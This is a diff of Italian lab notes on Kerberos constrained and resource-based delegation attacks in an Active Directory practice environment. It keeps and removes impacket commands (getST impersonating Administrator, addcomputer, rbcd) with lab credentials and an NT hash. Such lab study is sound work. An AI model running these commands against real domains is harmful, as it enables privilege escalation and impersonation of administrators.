@@ -32,14 +32,7 @@ Per exploitarlo isogna prima chiedere un TGT per l'utente e poi esguire S4U2Self
 impacket-getST -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
 ```
 ![[Pasted image 20230911111655.png]]
-*Senza protocol transition*
-Per exploitare una constrained delegation avremo bisogno di un TGS forwardabile come amminstratore su qualsiasi servizio su castelback, ma se facciamo lo stesso attacco di prima (S4U) falliremo.
+Puoi loggare dopo con wmixec
 
-Quindi per prima cosa aggiungeremo un nuovo computer al domain
-```bash
-impacket-addcomputer -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.56.11 'north.sevenkingdoms.local/arya.stark:Needle'
-```
-e settiamo quindi rbcd
-```bash
-impacket-rbcd -delegate-from 'rbcd_const$' -delegate-to 'castelblack$' -dc-ip 192.168.56.11 -action 'write' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' north.sevenkingdoms.local/'castelblack$'
-```
+### **Resource Based Constrained Delegation**
+Può essere abusato modificando msDS-AllowedToActOnBehalfOfOtherIdentity
